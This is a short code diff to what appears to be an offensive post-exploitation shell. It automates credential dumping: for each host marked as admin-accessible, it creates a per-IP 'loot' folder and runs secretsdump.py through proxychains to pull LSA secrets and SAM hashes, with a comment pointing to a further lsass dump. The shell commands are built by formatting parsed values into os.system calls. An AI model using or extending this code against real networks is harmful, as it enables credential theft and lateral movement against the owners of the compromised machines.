@@ -134,15 +134,15 @@ class MiniShell(cmd.Cmd):
                 tmp = tmp.replace('"', '')
                 tmp = tmp.replace('\n', '')
                 tmp = tmp.split('],')
-
+                # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
                 for item in tmp:
                     dat = item.replace(']', '').split(',')
                     if dat[3] == 'TRUE':
                         if dat[1] not in dumped_ips:
                             dumped_ips.append(dat[1]) # append the ip to dumped_ips to avoid dumping the same host twice
-
+                            os.system('sudo mkdir {}/loot/{}'.format(cwd, dat[1]))
                             #lsa secrets and sam dump courtesy of secretsdump
-                            os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'./loot/{}\''.format(dat[2], dat[1], dat[1]))
+                            os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}/{}\''.format(dat[2], dat[1], cwd, dat[1], dat[1]))
 
                             #lsass dump with reaper
 
